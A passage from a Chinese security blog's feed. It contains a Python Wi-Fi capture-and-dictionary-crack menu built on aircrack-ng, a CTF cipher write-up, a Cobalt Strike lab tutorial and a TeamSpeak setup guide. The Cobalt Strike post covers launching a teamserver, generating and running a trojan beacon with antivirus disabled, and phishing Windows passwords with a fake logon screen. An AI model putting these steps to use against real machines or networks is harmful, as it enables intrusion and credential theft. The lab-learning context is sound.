class="built_in">input</span>(</span><br><span class="line">                <span class="string">&#x27;Please type the netcard\&#x27;s name that you wanna use: &#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;wlan&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> Netcard:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;Unsupported netcard! <span class="subst">&#123;Netcard&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                StartListenerMode(Netcard)</span><br><span class="line">        <span class="keyword">if</span> Input == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> ListeningMode:</span><br><span class="line">                Netcard = <span class="built_in">input</span>(</span><br><span class="line">                    <span class="string">&#x27;Please type the netcard\&#x27;s name that you wanna use: &#x27;</span>)</span><br><span class="line">                NetCards = CardsInfo.split(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;wlan&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> Netcard:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;Unsupported netcard! <span class="subst">&#123;Netcard&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    HaveCard = <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> NetCards:</span><br><span class="line">                        <span class="keyword">if</span> Netcard <span class="keyword">in</span> i:</span><br><span class="line">                            HaveCard = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">if</span> HaveCard:</span><br><span class="line">                        DumpStatus(Netcard)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(</span><br><span class="line">                            <span class="string">f&#x27;Unable to find netcard <span class="subst">&#123;Netcard&#125;</span> in <span class="subst">&#123;NetCards&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;You need to start the listener first!&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> Input == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">            path = <span class="built_in">input</span>(</span><br><span class="line">                <span class="string">&#x27;Please input the path that you want to save the file (e.g: ./captured): &#x27;</span>)</span><br><span class="line">            PreviousPath = path</span><br><span class="line">            channel = <span class="built_in">int</span>(</span><br><span class="line">                <span class="built_in">input</span>(<span class="string">&#x27;Please input the channel that you want to listen to: &#x27;</span>))</span><br><span class="line">            bssid = <span class="built_in">input</span>(<span class="string">&#x27;Please input the bssid you want to listen to: &#x27;</span>)</span><br><span class="line">            netcard = <span class="built_in">input</span>(<span class="string">&#x27;Please input the netcard you want to use: &#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> path == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> channel == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> bssid == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> netcard == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Invalid parameters!&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                CapturePacket(channel=channel, bssid=bssid,</span><br><span class="line">                              netcard=netcard, path=path)</span><br><span class="line">        <span class="keyword">if</span> Input == <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">            path = <span class="built_in">input</span>(</span><br><span class="line">                <span class="string">f&#x27;Please input the file you want to crack (Default for the previous file <span class="subst">&#123;PreviousPath&#125;</span>): &#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> path == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                path = PreviousPath</span><br><span class="line">            dictionary = <span class="built_in">input</span>(</span><br><span class="line">                <span class="string">&#x27;Please input the dictionary that you want to use to crack: &#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> dictionary == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;You haven\&#x27;t specify a dictionary to crack the packet! Do you need some dictionarys? The avaliable dictionarys are listed below: &#x27;</span>)</span><br><span class="line">                dictionarys = requests.get(</span><br><span class="line">                    <span class="string">&#x27;https://gamernotitle.coding.net/p/Dictionarys/d/WIFI/git/raw/master/metadata.json?download=true&#x27;</span>).json()</span><br><span class="line">                <span class="built_in">print</span>(pformat(dictionarys))</span><br><span class="line">                option = <span class="built_in">input</span>(</span><br><span class="line">                    <span class="string">&#x27;Please input the name of the dictionary you want to use: &#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> option == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;You need to specify a dictionary to crack the packet!&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    Downloader(dictionarys[<span class="string">&#x27;data&#x27;</span>][option]</span><br><span class="line">                               [<span class="string">&#x27;link&#x27;</span>], <span class="string">f&#x27;./<span class="subst">&#123;option&#125;</span>.txt&#x27;</span>)</span><br><span class="line">                    dictionary = <span class="string">f&#x27;<span class="subst">&#123;option&#125;</span>.txt&#x27;</span></span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">f&#x27;Start cracking <span class="subst">&#123;path&#125;</span> with dictionary <span class="subst">&#123;dictionary&#125;</span>&#x27;</span>)</span><br><span class="line">                    CrackWithDict(path, dictionary)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;Start cracking <span class="subst">&#123;path&#125;</span> with dictionary <span class="subst">&#123;dictionary&#125;</span>&#x27;</span>)</span><br><span class="line">                CrackWithDict(path, dictionary)</span><br><span class="line">        <span class="keyword">if</span> Input == <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">            os.system(<span class="string">&#x27;apt update&#x27;</span>)</span><br><span class="line">            os.system(<span class="string">&#x27;apt install aircrack-ng -y&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> Input == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年全国大学生信息安全竞赛创新实践能力赛初赛 —— 部分WriteUp</title>
      <link href="/posts/CTF-20220529/"/>
      <url>/posts/CTF-20220529/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为今年第一年参加，其实啥也不会，所以就把做出来的题放出来吧</p><h2 id="签到电台"><a href="#签到电台" class="headerlink" title="签到电台"></a>签到电台</h2><h3 id="题目内容"><a href="#题目内容" class="headerlink" title="题目内容"></a>题目内容</h3><p>题目内容：豪密，是中国共产党和中国工农红军第一本无线电通讯密码的简称，由周恩来同志亲自编制，以周恩来党内化名“伍豪”命名，它是我党建立机要工作最早也是保密性能最强的一种密码，从二十世纪三十年代到全国解放，都始终未被破译。春秋GAME伽玛实验室团队通过对豪密的加密模式进行分析，并参考已有的文献资料，仿制豪密的加密方法，制作成一道题目，谨以此题致敬情报战线的先辈们。</p><p>请点击“下发赛题”，让我们一起穿越百年，追寻红色通信足迹。（关注“春秋伽玛”公众号，回复“签到电台”获取解题提示）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-20220529/image-20220529180757363.png?download=true"></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>这题题目中其实没有太多的信息，主要是进去的那个网页里面有东西：一个标准电码表、一个密码本，然后附了一个<a href="https://www.zhihu.com/question/30220915">参考资料</a></p><p>打开F12的开发者工具，然后按照要求点三下(即摩尔斯电码中的s)，就抓到了请求的模板（这里手动的后面多了个<code>J</code>，但是实测不要<code>J</code>也可以）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-20220529/image-20220529175857958.png?download=true"></p><p>即可以通过<code>http://&lt;域名&gt;:&lt;端口&gt;/send?msg=&lt;对应的英文字母&gt;</code>这样的格式，使用<code>GET</code>请求来发送信息</p><p>发送消息为”<strong>弼时安全到达了</strong>“，在密码本中直接<kbd>Ctrl</kbd> + <kbd>F</kbd>查找对应的字，得到对应的密码为<code>1732 2514 1344 0356 0451 6671 0055</code>，然后跟密码本的前28位进行模十运算（就是相加满十不进位），可以得到最终的密码为<code>5527054196298395149957904073</code></p><p>最后访问<code>http://&lt;域名&gt;:&lt;端口&gt;/send?msg=5527054196298395149957904073</code>得到最终的<code>flag&#123;f52cc5ad-02b8-435c-b3e6-d6f907bb87a0&#125;</code></p><p>附上我在做题的时候写的Python程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">codebook = <span class="string">&#x27;4895803783858049104891294028048877915993964884508701445170950472768818538157286879377568710737172419298890539211492159906706061553481596238704105315728289938582396161010201690117478415116408421577896895157832859368342230101663462972097373698261703992384839346255728696795365185881001654058108670883555430417806185446713801876774660320697572224607414161582051823332010943895369187926637133510089324514317205555123443145243388316267915082441584692640192647157276119645960280826103942635711642018106393519189267856807479524025909341&#x27;</span></span><br><span class="line"><span class="comment"># 密码本</span></span><br><span class="line">front28 = <span class="built_in">list</span>(codebook[:<span class="number">28</span>])</span><br><span class="line"><span class="comment"># 前28位数字</span></span><br><span class="line">secret = <span class="built_in">list</span>(<span class="string">&#x27;1732251413440356045166710055&#x27;</span>)</span><br><span class="line"><span class="comment"># 七个字对应的电码</span></span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(front28)):</span><br><span class="line">    result.append(<span class="built_in">str</span>(<span class="built_in">int</span>(front28[i])+<span class="built_in">int</span>(secret[i]))[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    res += i</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Msg decoded: <span class="subst">&#123;res&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h3><p>在最后一小时黑灯搏杀开始以后有人打平台被封IP了呼呼呼</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-20220529/image-20220529184647661.png?download=true"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF学习笔记（大学篇）03 —— CobaltStrike 详解</title>
      <link href="/posts/CTF-in-College-3/"/>
      <url>/posts/CTF-in-College-3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="CobaltStrike信息"><a href="#CobaltStrike信息" class="headerlink" title="CobaltStrike信息"></a>CobaltStrike信息</h3><div class="note info flat"><p>官网：<a href="https://www.cobaltstrike.com/">Cobalt Strike | Adversary Simulation and Red Team Operations</a></p></div><p>Cobalt Strike（下面会简称为CS）是一款由java编写的全平台多方协同渗透测试框架，在3.0版本之前它基于Metasploit框架工作，在3.0后的版本以独立成一个渗透测试平台。CobaltStrike集成了端口转发、端口扫描、socket代理、提权、钓鱼、远控木马等功能。该工具几乎覆盖了APT攻击链中所需要用到的各个技术环节，且其最大的优点在于可以进行团队合作和优越的UI界面。</p><p>不过这东西好像是要钱的，在百度搜索可以找到别人打包好的程序，包括汉化包、服务器等东西（自己找去吧），但是一定要注意，teamserver和CS程序本体的版本号一定要一样！</p><p>如果是官方下载的纯净版，那目录结构应该是长这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">CobaltStrike</span><br><span class="line">│  agscript</span><br><span class="line">│  c2lint</span><br><span class="line">│  cobaltstrike</span><br><span class="line">│  cobaltstrike.bat</span><br><span class="line">│  CSAgent.jar</span><br><span class="line">│  peclone</span><br><span class="line">│  teamserver</span><br><span class="line">│  tree.txt</span><br><span class="line">│  </span><br><span class="line">├─resources</span><br><span class="line">│      bdetails.txt</span><br><span class="line">│      bhelp.txt</span><br><span class="line">│      translation.txt</span><br><span class="line">│      </span><br><span class="line">└─scripts</span><br><span class="line">        default.cna</span><br></pre></td></tr></table></figure><h3 id="开启CS服务器"><a href="#开启CS服务器" class="headerlink" title="开启CS服务器"></a>开启CS服务器</h3><p>CS需要一台电脑作为监听服务器，这里我直接用物理机当服务器和攻击机，用虚拟机当目标机</p><p>在Windows下，需要把以下代码复制粘贴到一个bat文件（建议放在同目录），然后再运行监听服务器</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off   </span><br><span class="line">:check_java</span><br><span class="line">    java <span class="literal">-version</span> &gt;nul <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> %errorLevel% == <span class="number">0</span> (</span><br><span class="line">        goto:check_permissions</span><br><span class="line">    ) <span class="keyword">else</span> (</span><br><span class="line">        <span class="built_in">echo</span> [-] is Java installed?</span><br><span class="line">        goto:eof</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">:check_permissions</span><br><span class="line">    <span class="built_in">echo</span> [+] Administrative permissions required. Detecting permissions...</span><br><span class="line">    <span class="built_in">set</span> TempFile_Name=%SystemRoot%\System32\BatTestUACin_SysRt%Random%.batemp</span><br><span class="line">    (<span class="built_in">echo</span> <span class="string">&quot;BAT Test UAC in Temp&quot;</span> &gt;%TempFile_Name% ) <span class="number">1</span>&gt;nul <span class="number">2</span>&gt;nul</span><br><span class="line">    <span class="keyword">if</span> exist %TempFile_Name% (</span><br><span class="line">        <span class="built_in">echo</span> [+] Success: Administrative permissions confirmed.</span><br><span class="line"><span class="built_in">del</span> %TempFile_Name% <span class="number">1</span>&gt;nul <span class="number">2</span>&gt;nul</span><br><span class="line">        goto:check_certificate</span><br><span class="line">    ) <span class="keyword">else</span> (</span><br><span class="line">        <span class="built_in">echo</span> [-] Failure: Current permissions inadequate.</span><br><span class="line">        goto:eof</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">:check_certificate</span><br><span class="line">    <span class="built_in">set</span> certificate=<span class="string">&quot;.\cobaltstrike.store&quot;</span></span><br><span class="line">    <span class="keyword">if</span> exist %certificate% (</span><br><span class="line">        goto:test_arguments</span><br><span class="line">    ) <span class="keyword">else</span> (</span><br><span class="line">        <span class="built_in">echo</span> [!] Please generate the cobaltstrike.store !</span><br><span class="line">        <span class="built_in">echo</span> [!] Example: keytool <span class="literal">-keystore</span> ./cobaltstrike.store <span class="literal">-storepass</span> <span class="number">123456</span> <span class="literal">-keypass</span> <span class="number">123456</span> <span class="literal">-genkey</span> <span class="literal">-keyalg</span> RSA <span class="literal">-alias</span> cobaltstrike <span class="literal">-dname</span> <span class="string">&quot;CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth&quot;</span></span><br><span class="line">        goto:eof</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">:test_arguments</span><br><span class="line">    <span class="built_in">set</span> argC=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> %%x <span class="keyword">in</span> (%*) <span class="keyword">do</span> <span class="built_in">Set</span> /A argC+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> %argC% LSS <span class="number">2</span> (</span><br><span class="line">        <span class="built_in">echo</span> [-] teamserver ^&lt;host^&gt; ^&lt;password^&gt; [/<span class="type">path</span>/<span class="type">to</span>/<span class="type">c2.profile</span>] [<span class="type">YYYY</span>-<span class="type">MM</span>-<span class="type">DD</span>]</span><br><span class="line">        <span class="built_in">echo</span>     ^&lt;host^&gt; is the default IP address of this Cobalt Strike team server</span><br><span class="line">        <span class="built_in">echo</span>     ^&lt;password^&gt; is the shared password to connect to this server</span><br><span class="line">        <span class="built_in">echo</span>     [/<span class="type">path</span>/<span class="type">to</span>/<span class="type">c2.profile</span>] is your Malleable C2 profile</span><br><span class="line">        <span class="built_in">echo</span>     [<span class="type">YYYY</span>-<span class="type">MM</span>-<span class="type">DD</span>] is a <span class="built_in">kill</span> date <span class="keyword">for</span> Beacon payloads run from this server</span><br><span class="line">        goto:eof</span><br><span class="line">    ) <span class="keyword">else</span> (</span><br><span class="line">        goto:run_cobal</span><br><span class="line">    )</span><br><span class="line">:run_cobal</span><br><span class="line">    java <span class="literal">-Dfile</span>.encoding=UTF<span class="literal">-8</span> <span class="literal">-XX</span>:ParallelGCThreads=<span class="number">4</span> <span class="literal">-Xms512m</span> <span class="literal">-Xmx1024m</span> <span class="literal">-Dcobaltstrike</span>.server_port=<span class="number">50050</span> <span class="literal">-Djavax</span>.net.ssl.keyStore=./cobaltstrike.store <span class="literal">-Djavax</span>.net.ssl.keyStorePassword=<span class="number">123456</span> <span class="literal">-server</span> <span class="literal">-XX</span>:+AggressiveHeap <span class="literal">-XX</span>:+UseParallelGC <span class="literal">-classpath</span> ./cobaltstrike.jar server.TeamServer %*</span><br></pre></td></tr></table></figure><p>弄好了以后，打开Windows Terminal，运行下面的命令来打开监听服务器</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\teamserver.bat &lt;监听ip&gt; &lt;服务器密码&gt;</span><br></pre></td></tr></table></figure><p>这里监听IP<strong>不能是</strong><code>0.0.0.0</code>，必须指定ip。可以通过<code>ipconfig</code>来查看本机的ip地址，然后填在对应的位置，密码就自己设置了，另外打开的时候一定要用管理员权限！</p><p>开完了应该会像下面这张图这样显示</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-3/WindowsTerminal-20220526-225658.png?download=true"></p><p>然后打开CS软件本体，输入ip和密码进行连接，出现主页面即为连接成功</p><p>开CS软件本体的方式就很简单了，可以简单粗暴直接<code>java -jar cobaltstrike.jar</code>，也可以把下面这些内容复制到一个bat文件然后直接双击打开（下面这里用了汉化模组<code>CobaltStrikeCN.jar</code>，你可以在Github搜索下载）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java <span class="literal">-Dfile</span>.encoding=UTF<span class="literal">-8</span> <span class="literal">-javaagent</span>:CobaltStrikeCN.jar <span class="literal">-XX</span>:ParallelGCThreads=<span class="number">4</span> <span class="literal">-XX</span>:+AggressiveHeap <span class="literal">-XX</span>:+UseParallelGC  <span class="literal">-jar</span> cobaltstrike.jar</span><br></pre></td></tr></table></figure><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-3/java-20220526-230047.png?download=true"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-3/java-20220526-230431.png?download=true"></p><h3 id="生成木马文件"><a href="#生成木马文件" class="headerlink" title="生成木马文件"></a>生成木马文件</h3><p>这个其实很简单（如果不做免杀的话），直接在顶上找到齿轮图标点一下，然后选择一个监听器生成就行了，不过在生成之前要记得<strong>一定要关闭杀软</strong>（因为没做免杀，会被杀软直接干掉）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-3/java-20220526-230651.png?download=true"></p><p>这里我生成了一个名为<code>beacon.exe</code>的木马文件，把它丢到虚拟机里面双击运行（记得要把虚拟机的杀软也关了）</p><p>这里有个坑，如果你发现你的肉鸡很久都没有上线，那你应该去检查一下虚拟机的网络模式设定，我一开始设置的是NAT模式，但是NAT模式的网段跟本机的网段不太一样，就会连不上，所以要改成桥接模式才能够连接成功。</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-3/vmware-20220526-230905.jpg?download=true"></p><p>在虚拟机打开木马文件后，你攻击机的CS就会有上线提示了，然后会显示一些关于肉鸡的信息，如图所示</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-3/java-20220526-231119.png?download=true"></p><p>肉鸡上线的时候，第一件事情就是要调整延迟。如果说你想做到实时控制，那就要把延迟调整为0s，如果你想操作延迟执行，那就修改为对应的时间，默认是60s</p><p>修改也很简单，右击一下你的目标机器，在<code>会话</code>里面可以找到<code>Sleep</code>选项，点开以后修改就行了</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-3/java-20220526-231310.png?download=true"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-3/java-20220526-231346.png?download=true"></p><p>右击选择<code>进入beacon</code>可以进入CS提供的命令行，对目标机器进行操作</p><p>一般可以使用<code>shell &lt;powershell命令&gt;</code>的格式来执行Windows自带的命令，例如使用<code>shell notepad</code>就可以在目标机器打开一个记事本，使用<code>shell calc</code>就可以在目标机器打开一个计算器</p><h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><p>CS自己就带了不少的功能，例如提权、VNC等功能，但是这些功能不太够，幸好整个CS的生态里面是有很多大佬开发插件的，这里可以在Github上随便搜搜就能找到了。这里我装了一个<a href="https://github.com/z1un/Z1-AggressorScripts">z1un&#x2F;Z1-AggressorScripts: 适用于Cobalt Strike的插件 (github.com)</a>整个插件集，所以我这里右击肉鸡的时候多了一个<code>Z1</code>选项</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-3/java-20220526-231744.png?download=true"></p><p>这里就有很多功能了，这里可以讲一下一些有趣的功能</p><h4 id="用户密码钓鱼"><a href="#用户密码钓鱼" class="headerlink" title="用户密码钓鱼"></a>用户密码钓鱼</h4><p>很多计算机都会设置有电脑的登录密码，有的时候我们想获取用户的密码，那用得最烂但是挺有效的手段就是钓鱼（特别对于CSGO库存价值高的Steam用户来说肯定遇到过不少），这里Z1也给我们提供了对应的功能，我们可以在<code>Z1</code>-&gt;<code>读取密码</code>-&gt;<code>钓鱼密码窃取</code>-&gt;<code>FakeLogonScreen</code>里面使用这个功能，点击后会弹出一个小窗口，点击执行后，肉鸡就会显示一个钓鱼窗口了</p><p>不过有一说一这个窗口……做的还是挺次的</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-3/vmware-20220526-232727.jpg?download=true" alt="虚假的登录窗口"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-3/vmware-20220526-232450.jpg?download=true" alt="真实的登录窗口"></p><p>不过这个可以自动判断用户密码的正误，直到用户输入正确了才放行，控制台会实时弹用户输入密码的情况，但是但是，对于我这种用PIN登录的人来说，获取不到PIN</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-3/java-20220526-232917.png?download=true" alt="输入错误"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-3/java-20220526-232929.png?download=true" alt="输入正确"></p><p>还有一种钓鱼窗口就是Windows自带的那种认证窗口（如图）【紫色的表框是VMware的Unity模式带的，在正常的系统中显示实际上是没有没有】</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-3/vmware-20220526-233132.png?download=true"></p><p>不过也有一个缺点就是：正常的巨硬认证窗口是不能移动的，这个可以……</p><p>打开这个窗口也不难，只是在刚刚上面那个Windows登录的那个选项那里选择下面那个，然后设定一下标题（在这里是<code>安全认证</code>这几个字）就可以了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Teamspeak服务器搭建指南</title>
      <link href="/posts/Teamspeak-Server/"/>
      <url>/posts/Teamspeak-Server/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>在跟群里的水友们进行语音的时候，我用的一般都是扣扣语音，没错就是那个Bug百出而且还超级烂的扣扣语音，虽然有一段时间用过开黑啦，但是感觉不如Discord的体验好。但是水友又不是个个都会用Discord，后来经过我们的商讨，我们决定转战Teamspeak.</p><p>下面我将会以我的经验来告诉你，一个Teamspeak服务器应该怎么搭建</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Teamspeak-Server/TeamSpeak-20220507-173159.png?download=true"></p><hr><p>首先Teamspeak不像QQ那样有官方的服务器可以用，所有的服务器都是自己搭建的（当然也有很多别人搭建好的能用，不过为了安全性考虑还是推荐自己搭建）</p><p><strong>在教程中，我可能会Teamspeak5和Teamspeak3混用（因为我没有TS5的BETA KEY，有些功能还不能用，不过能用TS5的我还是会用TS5）</strong></p><h2 id="安装Teamserver"><a href="#安装Teamserver" class="headerlink" title="安装Teamserver"></a>安装Teamserver</h2><div class="note info flat"><p><a href="https://teamspeak.com/en/downloads/#server">TeamSpeak Downloads | TeamSpeak</a></p></div><p>你需要到Teamserver的官网下载服务器，根据你的服务器系统下载所需要的版本（上面这个直接指向服务器下载页面）</p><p>因为我这台服务器是<code>Debian GNU/Linux 10(Py3.7.9) x64</code>，所以我这里下载linux 64位的版本，下载完以后直接解压</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Teamspeak-Server/msedge-20220507-194553.png"></p><p>解压以后会得到下面这张图所示的这一堆东西</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Teamspeak-Server/msedge-20220507-194731.png"></p><p>接着我们运行下面的命令</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Teamspeak-Server/msedge-20220507-195059.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">chmod</span> +x *</span><br><span class="line">sh ts3server_startscript.sh start</span><br></pre></td></tr></table></figure><p>它会启动我们的teamspeak服务器，如果你是<code>root</code>用户启动，会跟我一样收到来自teamspeak的提醒</p><div class="note warning flat"><p><code>WARNING ! For security reasons we advise: DO NOT RUN THE SERVER AS ROOT</code></p></div><p>如果你觉得以<code>root</code>用户启动没啥问题的话也可以不用管它，我这里因为是用了别人的服务器做教学，别人的默认账户是<code>root</code>，所以就弹了这个</p><p>运行后红框里面的意思就是让我们去看LICENSE和EULA之类的东西（跟你开个MC服务器是一样的），这里我们新建一个<code>.ts3server_license_accepted</code>来代表我们已阅读并同意LICENSE和EULA（请认真阅读后再进行此操作）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> .ts3server_license_accepted</span><br></pre></td></tr></table></figure><p>接着我们再次运行teamspeak服务器，这次就会正常开启了</p><p>第一次开启会给我们一个privilege key（特权密钥），我们需要用这个密钥来认领我们的服务器（认领的同时我们会获得管理员权限）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Teamspeak-Server/msedge-20220507-195914.png"></p><p>不过在连接之前，请确保你的防火墙开放了如图所示的端口</p><p><img 